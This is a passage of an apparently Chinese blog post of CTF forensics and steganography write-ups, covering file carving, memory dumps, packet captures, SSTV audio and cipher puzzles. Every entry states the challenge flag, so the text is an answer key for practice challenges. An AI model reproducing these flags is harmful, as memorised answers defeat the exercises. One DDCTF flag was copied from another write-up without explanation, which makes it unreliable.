src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900172028.f5811b666a2478f4b3994279faefbcbb97c9a9f9.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uctflag&#123;sp3tr0gr4m0ph0n3&#125;</span><br></pre></td></tr></table></figure><h3 id="UTCTF2020-File-Carving"><a href="#UTCTF2020-File-Carving" class="headerlink" title="[UTCTF2020]File Carving"></a>[UTCTF2020]File Carving</h3><p>010 editor 打开文件可以发现文件尾部有压缩包，分离出来解压得到一个 ELF。IDA Pro 打开反编译主程序可看到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900214442.e070c2b85c8fc8fa3fabc9dacbe602fa9c473b87.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;2fbe9adc2ad89c71da48cabe90a121c0&#125;</span><br></pre></td></tr></table></figure><h3 id="RCTF2019-disk"><a href="#RCTF2019-disk" class="headerlink" title="[RCTF2019]disk"></a>[RCTF2019]disk</h3><p>用 010 editor 打开后可以找到 flag 的前半部分。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900253409.da17ceea90e49c846458b930d35e04350df74231.png"></p><p>到这里之后本题又少信息了，原题给了 VeraCrypt 的密码 <code>rctf</code>。这里先用 7z 将 vmdk 解压得到一个 fat 文件。再使用 VeraCrypt 加载。挂载磁盘之后可以得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Password 2: RCTF2019</span><br></pre></td></tr></table></figure><p>使用新的密码挂载 VeraCrypt 的隐藏分区。挂载之后使用 WinHex 载入磁盘可以看到后一半 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900293847.0349fbbf4d26fbc30f812948ab13444c4d7b0b37.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rctf&#123;unseCure_quick_form4t_vo1umer_and_corrupted_1nner_v0lume&#125;</span><br></pre></td></tr></table></figure><h3 id="HDCTF2019-你能发现什么蛛丝马迹吗"><a href="#HDCTF2019-你能发现什么蛛丝马迹吗" class="headerlink" title="[HDCTF2019]你能发现什么蛛丝马迹吗"></a>[HDCTF2019]你能发现什么蛛丝马迹吗</h3><p>使用 Volatility2 进行镜像分析。首先 <code>imageinfo</code> 确定一下 profile。发现是 <code>Win2003SP0x86, Win2003SP1x86, Win2003SP2x86</code>，随便选一个开始 <code>filescan | grep 桌面</code> 看一下桌面的文件，发现一个 flag.png。将其提取出来，扫描发现是一段加密文本，接着回去找密钥。</p><p> <img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900327939.86fac65867a78a60fcb993a5ccf5b85e712a4632.png"></p><p>首先 <code>pslist</code> 一下，发现没有 notepad 等可能读取文本文档的进程，只有 DumpIt.exe 比较可疑。考虑到在桌面发现的图片，将资源管理器的进程一起 dump 下来。使用 binwalk 分析可以发现资源管理器的 dumpfile 里面有好几个图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900363058.462e144143272954110ac81fa3f925d4cb7dcd0e.png"></p><p>使用 foremost 将其分离出来，成功发现包含密钥的图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900396348.980736a79a5f7dd4950559971167ec6a420696f4.png"></p><p>使用 AES 将密文解密即得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900441168.aec3956b128d8db6b076d8d2e743f1181f2bdc62.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125;</span><br></pre></td></tr></table></figure><h3 id="watevrCTF-2019-Evil-Cuteness"><a href="#watevrCTF-2019-Evil-Cuteness" class="headerlink" title="[watevrCTF 2019]Evil Cuteness"></a>[watevrCTF 2019]Evil Cuteness</h3><p>010 editor 打开图片可在文件尾部发现压缩文档，分离出来解压即可得到 flag 文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900478729.41075ef75b924f4d63393fec9e54a2f0abca5880.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watevr&#123;7h475_4c7u4lly_r34lly_cu73_7h0u6h&#125;</span><br></pre></td></tr></table></figure><h3 id="BSidesSF2019-table-tennis"><a href="#BSidesSF2019-table-tennis" class="headerlink" title="[BSidesSF2019]table-tennis"></a>[BSidesSF2019]table-tennis</h3><p>Wireshark 打开流量包，跟到 ICMP 流量可以发现 Data 里面有 HTML 文档的数据。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900520133.c13454b9ab8f4c29c563deecc79d4e32794914c8.png"></p><p>筛选 <code>frame.coloring_rule.string == &quot;icmp || icmpv6&quot;</code> 可以看到流量包中的 ICMP 流量，读末尾的数据可以发现关键数据是一段 base64，将其取出后 base64 解码即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;JustAS0ngAb0utP1ngP0ng&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2017-sanity"><a href="#INSHack2017-sanity" class="headerlink" title="[INSHack2017]sanity"></a>[INSHack2017]sanity</h3><p>Markdown 文档，打开即可看到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900559756.8b6999cfef90a3af6323b2a94209b380d9fff87c.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;Youre_sane_Good_for_you&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2019-INSAnity"><a href="#INSHack2019-INSAnity" class="headerlink" title="[INSHack2019]INSAnity"></a>[INSHack2019]INSAnity</h3><p>Markdown 文档，打开即可看到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900597335.2005f8baa6df39651bb902bfebf35fb1d97d2f14.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;YouRe_Crazy_and_I_Love_it&#125;</span><br></pre></td></tr></table></figure><h3 id="UTCTF2020-sstv"><a href="#UTCTF2020-sstv" class="headerlink" title="[UTCTF2020]sstv"></a>[UTCTF2020]sstv</h3><p>RX-SSTV 接收可得如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900635736.04d4d95bdd2b67339127922ad727fe597e402020.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;6bdfeac1e2baa12d6ac5384cdfd166b0&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2019-Sanity"><a href="#INSHack2019-Sanity" class="headerlink" title="[INSHack2019]Sanity"></a>[INSHack2019]Sanity</h3><p>Markdown 文档，打开即可看到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900689319.14a2388ca937d42475f73e637f7c9fafbc2b3f9d.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;Welcome&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2017-insanity"><a href="#INSHack2017-insanity" class="headerlink" title="[INSHack2017]insanity-"></a>[INSHack2017]insanity-</h3><p>Markdown 文档，打开即可看到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900723478.e0d488bdc4870f2ed0aa45f31b995604ba391b16.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;Youre_crazy_I_like_it&#125;</span><br></pre></td></tr></table></figure><h3 id="GUET-CTF2019-520的暗示"><a href="#GUET-CTF2019-520的暗示" class="headerlink" title="[GUET-CTF2019]520的暗示"></a>[GUET-CTF2019]520的暗示</h3><p>解压得到一个二进制文件，将其与 0x33 做异或运算可以得到一个 jpg 图像。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900776008.1be578e4ed4ffdf3645722305e5053bf5df38360.jpg"></p><p>查询基站的定位即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900827442.b661b9af66ce21820a9ed3c17c5e5ecc1b013936.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;桂林电子科技大学花江校区&#125;</span><br></pre></td></tr></table></figure><h3 id="CFI-CTF-2018-webLogon-capture"><a href="#CFI-CTF-2018-webLogon-capture" class="headerlink" title="[CFI-CTF 2018]webLogon capture"></a>[CFI-CTF 2018]webLogon capture</h3><p>Wireshark 分析数据包，看请求可得一串字符串，URL Decode 之后可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CFI&#123;1ns3cur3_l0g0n&#125;</span><br></pre></td></tr></table></figure><h3 id="key不在这里"><a href="#key不在这里" class="headerlink" title="key不在这里"></a>key不在这里</h3><p>将解压得到的图片用PhotoShop 反色之后识别二维码，得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cn.bing.com&#x2F;search?q&#x3D;key%E4%B8%8D%E5%9C%A8%E8%BF%99%E9%87%8C&amp;m&#x3D;10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&amp;qs&#x3D;n&amp;form&#x3D;QBRE&amp;sp&#x3D;-1&amp;sc&#x3D;0-38&amp;sk&#x3D;&amp;cvid&#x3D;2CE15329C18147CBA4C1CA97C8E1BB8C</span><br></pre></td></tr></table></figure><p>将其中的 <code>m</code> 取出来并整理分组，经过 <code>From Decimal --&gt; URL Decode</code> 的路径解码后可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5d45fa256372224f48746c6fb8e33b32&#125;</span><br></pre></td></tr></table></figure><h3 id="很好的色彩呃？"><a href="#很好的色彩呃？" class="headerlink" title="很好的色彩呃？"></a>很好的色彩呃？</h3><p>解压得到一张图片，取色器看每部分黄绿色的颜色可知只有最后两位有差别，因此将其取出来。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900864440.95d17f13225e6bdbfe9d9471b82c5609799c8efa.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">61 61 70 6a 65 73</span><br></pre></td></tr></table></figure><p>将其从十六进制转十进制即得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;aapjes&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-摇滚DJ（建议大声播放"><a href="#MRCTF2020-摇滚DJ（建议大声播放" class="headerlink" title="[MRCTF2020]摇滚DJ（建议大声播放"></a>[MRCTF2020]摇滚DJ（建议大声播放</h3><p>附件是一段音频，RX-SSTV 接收可以得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900920693.8a3d5f08de195348474c21d4fee1ddd1f8bd5d06.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">merak&#123;r3ce1ved_4n_img&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2018-Self-Congratulation"><a href="#INSHack2018-Self-Congratulation" class="headerlink" title="[INSHack2018]Self Congratulation"></a>[INSHack2018]Self Congratulation</h3><p>附件是一张图片，左上角有黑白相间的方块。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900961869.6847562ef70ff6d7a32b71f0f6bd943f4b1ca68e.png"></p><p>将其转译为二进制数据得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">001100010011001000110011001101000011010100110110001101110011100000</span><br></pre></td></tr></table></figure><p>去除掉最后两位 00，可以转成 ASCII 字符 <code>12345678</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;12345678&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2018-INSanity"><a href="#INSHack2018-INSanity" class="headerlink" title="[INSHack2018]INSanity"></a>[INSHack2018]INSanity</h3><p>Markdown 文档，打开即可看到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900995822.847d10db3b3cc461ba9aec7e7f1afef6ec90e1e4.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;let_the_game_begin!&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-frequency"><a href="#ACTF新生赛2020-frequency" class="headerlink" title="[ACTF新生赛2020]frequency"></a>[ACTF新生赛2020]frequency</h3><p>解压得到一个 word 文档，打开发现隐藏文字，同时其备注还有一串字符串。将其二者拼在一起，然后 base64 解码。将解码后的字符串进行字频统计。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(&#39;1: &#39;, (&#39;a&#39;, 198))</span><br><span class="line">(&#39;2: &#39;, (&#39;c&#39;, 194))</span><br><span class="line">(&#39;3: &#39;, (&#39;t&#39;, 188))</span><br><span class="line">(&#39;4: &#39;, (&#39;f&#39;, 180))</span><br><span class="line">(&#39;5: &#39;, (&#39;p&#39;, 174))</span><br><span class="line">(&#39;6: &#39;, (&#39;l&#39;, 170))</span><br><span class="line">(&#39;7: &#39;, (&#39;o&#39;, 164))</span><br><span class="line">(&#39;8: &#39;, (&#39;k&#39;, 159))</span><br><span class="line">(&#39;9: &#39;, (&#39;m&#39;, 152))</span><br><span class="line">(&#39;10: &#39;, (&#39;i&#39;, 145))</span><br><span class="line">(&#39;11: &#39;, (&#39;j&#39;, 139))</span><br><span class="line">(&#39;12: &#39;, (&#39;n&#39;, 133))</span><br><span class="line">(&#39;13: &#39;, (&#39;u&#39;, 128))</span><br><span class="line">(&#39;14: &#39;, (&#39;h&#39;, 116))</span><br><span class="line">(&#39;15: &#39;, (&#39;b&#39;, 109))</span><br><span class="line">(&#39;16: &#39;, (&#39;y&#39;, 106))</span><br><span class="line">(&#39;17: &#39;, (&#39;g&#39;, 100))</span><br><span class="line">(&#39;18: &#39;, (&#39;v&#39;, 92))</span><br><span class="line">(&#39;19: &#39;, (&#39;r&#39;, 87))</span><br><span class="line">(&#39;20: &#39;, (&#39;d&#39;, 79))</span><br><span class="line">(&#39;21: &#39;, (&#39;x&#39;, 73))</span><br><span class="line">(&#39;22: &#39;, (&#39;e&#39;, 68))</span><br><span class="line">(&#39;23: &#39;, (&#39;s&#39;, 61))</span><br><span class="line">(&#39;24: &#39;, (&#39;z&#39;, 54))</span><br><span class="line">(&#39;25: &#39;, (&#39;w&#39;, 48))</span><br><span class="line">(&#39;26: &#39;, (&#39;q&#39;, 41))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;plokmijnuhbygvrdxeszwq&#125;</span><br></pre></td></tr></table></figure><h3 id="greatescape"><a href="#greatescape" class="headerlink" title="greatescape"></a>greatescape</h3><p>Wireshark 分析流量包，TCP 流量跟踪到流 19 可以发现 RSA 私钥，将其保存下来。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901042903.d6346f12c3a9c88a78e68580f226854d762d35f4.png"></p><p>将密钥导入 Wireshark，跟踪 TLS 流到 80 可以在请求中看到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901088188.b3c6f4e3c0d50361b49af55c6e130ff2c752fb00.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INS&#123;OkThatWasWay2Easy&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2019-gflag"><a href="#INSHack2019-gflag" class="headerlink" title="[INSHack2019]gflag"></a>[INSHack2019]gflag</h3><p>G Code 文件，上传到<a href="https://gcode.ws/">在线预览的网站</a>可以看到包含 flag 的渲染。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901130598.5dffcc1a1b0671a3195f897175ce0f4082e995b6.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;3d_pr1nt3d_fl49&#125;</span><br></pre></td></tr></table></figure><h3 id="GKCTF2020-Sail-a-boat-down-the-river"><a href="#GKCTF2020-Sail-a-boat-down-the-river" class="headerlink" title="[GKCTF2020]Sail a boat down the river"></a>[GKCTF2020]Sail a boat down the river</h3><p>视频中可见一个二维码，扫描后可得到一个百度网盘链接。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901238182.5fa3a3990cf5e2448d66f064d03e53ca94871f73.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1tygt0Nm_G5fTfVFlgxVcrQ</span><br></pre></td></tr></table></figure><p>根据视频中刷卡器的闪烁可以得出摩斯电码。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-.-- .-- ---.. --.</span><br><span class="line">yw8g</span><br></pre></td></tr></table></figure><p>下载得到数独文件，将<a href="https://www.sudoku.name/sudoku-solver/cn">数独</a>解出可得到密钥。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901273032.a322c46e86ae0dd8736f5a457b630c4d40ae6a54.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">52693795149137</span><br></pre></td></tr></table></figure><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901311480.aab73ec297068da4ab6999de1f74932da51e73d5.png"></p><p>将明文作为压缩包的解压密码将其解压。使用 OverTure 打开解压出来的谱面，可找到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901342028.790e8ba166fd7a129326a340fb05f32fe1119ab8.png"><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901378336.c048f2656f343ebea824b2d9c8a6e42101252354.png"><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901419786.ca38b687799ddb0c7bccabcf7302ea81843898ea.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;gkctf_is_fun&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-小O的考研复试"><a href="#MRCTF2020-小O的考研复试" class="headerlink" title="[MRCTF2020]小O的考研复试"></a>[MRCTF2020]小O的考研复试</h3><p>简单 JavaScript 算一下可以得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901463899.bd3fe6cf9cd44fb44113cac2c6205445f85729b4.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;577302567&#125;</span><br></pre></td></tr></table></figure><h3 id="QCTF2018-X-man-Keyword"><a href="#QCTF2018-X-man-Keyword" class="headerlink" title="[QCTF2018]X-man-Keyword"></a>[QCTF2018]X-man-Keyword</h3><p>Cloacked Pixel 可以解出隐藏的文字。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901502506.66eb9df2b24b719271d4d67cb1852ce6054efece.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVSF&#123;vVckHejqBOVX9C1c13GFfkHJrjIQeMwf&#125;</span><br></pre></td></tr></table></figure><p>使用 Nihilist 对应的解码可以得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901540825.1d6a3e55c16b1832902fbb94c07ea4eb6ba0f072.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QCTF&#123;cCgeLdnrIBCX9G1g13KFfeLNsnMRdOwf&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-寻找xxx"><a href="#MRCTF2020-寻找xxx" class="headerlink" title="[MRCTF2020]寻找xxx"></a>[MRCTF2020]寻找xxx</h3><p>解压得到一段 DTMF 音频，上传到在线工具得到如下内容。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901579590.9cbc56d9d50918606189cae938fe6712faa8c64f.png"></p><p>一开始以为这就是 flag，结果是要把数字发给公众号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;Oh!!!!!_Y0u_f1nd_my_secret&#125;</span><br></pre></td></tr></table></figure><h3 id="Beautiful-Side"><a href="#Beautiful-Side" class="headerlink" title="Beautiful_Side"></a>Beautiful_Side</h3><p>解压所得的图片末尾还有一张 PNG 图像，提取出来之后是半个二维码。先将其定位码补全。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901626376.b76a0ce618dfc068f942ade70e29ca8678cb8749.png"></p><p>将其上传到 <a href="https://merricx.github.io/qrazybox/">QRazyBox</a> 尝试修复二维码。在纠错等级为高，遮掩层模式为 2 的时候发现可以成功提取出 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901670720.6b7bc458b03446f425cbda3a9a5ea61b02409c55.png"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901719109.fadfb4be54ef6f2ee1c9b22c2db8e1a6e01c74c5.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag&#123;OQWIC_4DS1A_S034S&#125;</span><br></pre></td></tr></table></figure><h3 id="XMAN2018排位赛-AutoKey"><a href="#XMAN2018排位赛-AutoKey" class="headerlink" title="[XMAN2018排位赛]AutoKey"></a>[XMAN2018排位赛]AutoKey</h3><p>Wireshark 打开发现是 USB 流量包，稍微跟一下发现跟鼠键的很像，于是用脚本提取出来。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] Found : &lt;CAP&gt;a&lt;CAP&gt;utokey(&#39;****&#39;).decipheer(&#39;&lt;CAP&gt;mplrvffczeyoujfjkybxgzvdgqaurkxzolkolvtufblrnjesqitwahxnsijxpnmplshcjbtyhzealogviaaissplfhlfswfehjncrwhtinsmambvexo&lt;DEL&gt;pze&lt;DEL&gt;iz&#39;)</span><br></pre></td></tr></table></figure><p>整理后得到如下密文。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mplrvffczeyoujfjkybxgzvdgqaurkxzolkolvtufblrnjesqitwahxnsijxpnmplshcjbtyhzealogviaaissplfhlfswfehjncrwhtinsmambvexpziz</span><br></pre></td></tr></table></figure><p>使用<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/">在线网站</a>提供的爆破脚本，可以解出如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-674.914569565 autokey, klen 8 :&quot;FLAGHERE&quot;, HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF&#125;</span><br></pre></td></tr></table></figure><h3 id="DDCTF2018-第四扩展FS"><a href="#DDCTF2018-第四扩展FS" class="headerlink" title="[DDCTF2018]第四扩展FS"></a>[DDCTF2018]第四扩展FS</h3><p>010 editor 打开图片发现文件末尾有未知区块。提取出来仔细甄别可以知道有一个压缩文档。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901761744.c3afa3c3011541f6c0d21460d25e3d172e2bfebb.png"></p><p>将压缩文档提取出来，发现需要密码。在 FS.jpg 的备注中发现了字符串 <code>Pactera</code>，将其作为密码可以成功解压文档。根据文档内容可猜测需要做频次分析，于是做频次分析得到如下结果。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901796742.ab15f3adbb878afe6d52dd98d3052e95b0b3c2fc.png"></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- DDCTF&#123;huanwe1sik4o!&#125; //我这次得到的 flag</span></span><br><span class="line"><span class="addition">+ DDCTF&#123;x1n9shaNgbIci&#125; //网上某 WriteUp 的 flag (我也不知道为什么交这个是对的)</span></span><br></pre></td></tr></table></figure><h3 id="INSHack2017-hiding-in-plain-sight"><a href="#INSHack2017-hiding-in-plain-sight" class="headerlink" title="[INSHack2017]hiding-in-plain-sight"></a>[INSHack2017]hiding-in-plain-sight</h3><p>binwalk 可以发现解压出来的图片里有多张图片，于是 foremost 将其分离出来。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901837036.18bfd66fac06534b54fa0c08c4973b0b95216fc1.png"></p><p>得到一张包含 flag 的图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213901876779.17587279cbb68bea9f5e9ff06a1632ac43083fbe.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;l337_h4xx0r5_c0mmun1c473_w17h_PNGs&#125;</span><br></pre></td></tr></table></figure><h3 id="CFI-CTF-2018-CFI-in-Kotlin"><a href="#CFI-CTF-2018-CFI-in-Kotlin" class="headerlink" title="[CFI-CTF 2018]CFI-in-Kotlin"></a>[CFI-CTF 2018]CFI-in-Kotlin</h3><blockquote><p>skylot/jadx: <a href="https://github.com/skylot/jadx">https://github.com/skylot/jadx</a></p></blockquote><p>jadx 简单反编译附件给出的 APK，在 <code>com/sagold/cfievent/LoginActivity.java</code> 下可以找到如下代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DUMMY_CREDENTIALS = &#123;<span 